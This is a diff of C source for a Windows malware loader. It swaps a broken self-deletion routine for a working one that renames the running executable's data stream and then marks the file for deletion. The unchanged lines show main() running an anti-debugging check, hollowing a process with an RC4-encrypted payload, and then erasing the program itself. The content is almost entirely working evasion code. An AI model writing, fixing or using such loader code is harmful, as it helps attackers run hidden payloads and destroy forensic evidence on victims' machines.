@@ -258,65 +258,94 @@ void detectDebug() {
     return FALSE;
 }
 
-
-void selfDelete() {
-
-    HANDLE hFile = INVALID_HANDLE_VALUE; //We need to retrieve a file handle to THIS running process.
-    const wchar_t* datastream = "noah";
-
-    size_t sRenameSize = sizeof(FILE_RENAME_INFO) + sizeof(datastream); //
-    PFILE_RENAME_INFO pFRI = NULL; //this structure contains the target name that a source file should be renamed to.
-                                   //it also has fields for file lenghts
-                                   //filename can be a filepath or the new name of a NTFS file stream starting with :
-    
-    FILE_DISPOSITION_INFO FDI = { 0 }; //this structure contains the field tha if a file should be deleted or not when set to true
-    
-
-    pFRI = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(datastream) );
-    
-    //zero out structures
-    ZeroMemory(&FDI, sizeof(FDI));
-
-    //now we need to mark that the file should be deleted in file_disposition_struct
-
-    FDI.DeleteFileW = TRUE;
-    printf("Marked for deletion in strcut");
-
-    //now populate the file_rename_info struct
-
-    pFRI->FileNameLength = sizeof(datastream); // set new file name length to length of new datastream name
-
-    RtlCopyMemory(pFRI->FileName, datastream, sizeof(datastream)); //copy new datastream name into struct
-
-    printf("Set new stream name to %S", pFRI->FileName);
-    printf("Set new stream name length to %d", pFRI->FileNameLength);
-
-    //now get current file name w GetModuleHandle
-
-    //If first parameter is null, use current process and store in second parameter.
-    WCHAR localFilePath[MAX_PATH * 2] = { 0 };
-    GetModuleFileNameW(NULL, localFilePath, MAX_PATH * 2);
+#define NEW_STREAM L":Noah"
+BOOL DeleteSelf() {
 
 
-    //now we get handle to this file, then use SetFileINformationBYHandle func
-    //This lets use pass a FileINformationClass structure, isnide of that is an attribute for a file disposition info struct!
+    WCHAR                       szPath[MAX_PATH * 2] = { 0 };
+    FILE_DISPOSITION_INFO       Delete = { 0 };
+    HANDLE                      hFile = INVALID_HANDLE_VALUE;
+    PFILE_RENAME_INFO           pRename = NULL;
+    const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
+    SIZE_T			            StreamLength = wcslen(NewStream) * sizeof(wchar_t);
+    SIZE_T                      sRename = sizeof(FILE_RENAME_INFO) + StreamLength;
 
 
-    //minimum amount of access rights is DELETE|SYNCHRONIZE.
-    HANDLE localHandle = CreateFileW(localFilePath, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+    // Allocating enough buffer for the 'FILE_RENAME_INFO' structure
+    pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
+    if (!pRename) {
+        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
 
-    //now set the strcut info
-    getchar();
-    SetFileInformationByHandle(localHandle, FileRenameInfo, pFRI, sRenameSize);
-    //to make changes we MUST MUST MUST CLOSE HANDLE, CHANGES ARE DONE ON HANDLE CLOSE.
-    getchar();
-    CloseHandle(localHandle);
+    // Cleaning up some structures
+    ZeroMemory(szPath, sizeof(szPath));
+    ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));
 
-    //file should be deleted by the OS at this point....
+    //----------------------------------------------------------------------------------------
+    // Marking the file for deletion (used in the 2nd SetFileInformationByHandle call) 
+    Delete.DeleteFile = TRUE;
 
-    HeapFree(GetProcessHeap(), 0, pFRI);
+    // Setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
+    pRename->FileNameLength = StreamLength;
+    RtlCopyMemory(pRename->FileName, NewStream, StreamLength);
 
-    //now take this stream and 
+    //----------------------------------------------------------------------------------------
+
+    // Used to get the current file name
+    if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
+        printf("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
+
+    //----------------------------------------------------------------------------------------
+    // RENAMING
+
+    // Opening a handle to the current file
+    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("[!] CreateFileW [R] Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
+
+    wprintf(L"[i] Renaming :$DATA to %s  ...", NEW_STREAM);
+
+    // Renaming the data stream
+    if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
+        printf("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
+    wprintf(L"[+] DONE \n");
+
+    CloseHandle(hFile);
+
+    //----------------------------------------------------------------------------------------
+    // DELETING
+
+    // Opening a new handle to the current file
+    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("[!] CreateFileW [D] Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
+
+    wprintf(L"[i] DELETING ...");
+
+    // Marking for deletion after the file's handle is closed
+    if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
+        printf("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
+    wprintf(L"[+] DONE \n");
+
+    CloseHandle(hFile);
+
+    //----------------------------------------------------------------------------------------
+
+    // Freeing the allocated buffer
+    HeapFree(GetProcessHeap(), 0, pRename);
+
+    return TRUE;
 }
 int main() {
 
@@ -344,6 +373,6 @@ int main() {
     //}
     detectDebug();
     hollowProcess(Pi, sizeof(Rc4CipherText));
-    selfDelete();
+    DeleteSelf();
     return 0;
 }
